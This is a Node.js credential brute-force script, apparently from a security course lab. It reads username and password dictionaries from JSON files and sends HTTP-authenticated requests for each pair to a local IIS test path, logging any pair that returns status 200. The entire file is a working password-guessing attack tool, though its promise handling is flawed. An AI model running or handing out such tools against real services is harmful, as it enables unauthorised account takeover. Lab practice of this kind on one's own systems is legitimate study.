"use strict";

const request = require("request");
const {users} = require("./users.json");
const {passwords} = require("./dictionnaire.json");

testUsersAndPassword("http://127.0.0.1/securityModel3IL/Scripts/bruteForceIIS/test/", users, passwords);

function sendREquest(url, username, password) {
    return new Promise((resolve, reject) => {
        request.get(url, {
            auth: {
                user: username,
                pass: password,
                sendImmediately: false
            }
        }).on("response", (response) => {
            if (response.statusCode === 200) {
                resolve(true);
            } else {
                resolve(false);
            }
        })
    });
}

function testPassword(url, username, passwords) {
    return new Promise((resolve, reject) => {
        for (const password of passwords) {
            sendREquest(url, username, password).then(responseStatus => {
                if (responseStatus) {
                    console.log(`${username} => ${password}`);
                    resolve(true);
                }
            });
        }
        resolve(false);
    });
}

function testUsersAndPassword(url, users, passwords) {
    for (const user of users) {
        testPassword(url, user, passwords);
    }
}